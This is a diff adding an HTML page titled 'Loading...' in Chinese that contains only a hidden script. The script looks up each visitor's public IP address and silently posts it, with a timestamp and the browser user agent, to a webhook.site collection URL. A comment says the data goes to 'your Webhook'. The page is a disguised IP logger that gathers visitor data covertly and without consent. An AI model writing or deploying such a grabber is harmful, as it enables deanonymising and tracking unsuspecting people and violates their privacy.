@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>加载中...</title>
+</head>
+<body>
+  <script>
+    // 获取用户IP并发送到你的 Webhook
+    fetch("https://api64.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        fetch("https://webhook.site/aba8819b-dba9-4b77-8005-e64b096f31fa", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ip: data.ip,
+            time: new Date().toISOString(),
+            userAgent: navigator.userAgent
+          })
+        });
+      });
+  </script>
+</body>
+</html>
